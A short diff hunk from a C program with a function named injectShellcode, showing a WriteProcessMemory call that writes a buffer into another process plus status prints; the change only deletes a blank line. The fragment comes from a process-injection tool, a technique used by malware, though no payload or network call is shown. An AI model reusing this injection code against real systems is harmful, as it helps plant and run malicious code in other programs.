@@ -135,7 +135,6 @@ int injectShellcode() {
 	WriteProcessMemory(hProcess, rBuffer, buf, sizeof(buf), NULL);
 	printf("\n%s wrote to process memory", ok);
 
-
 	DWORD sleepTime;
 
 	printf("\n\n%s time to sleep (in seconds)", in);
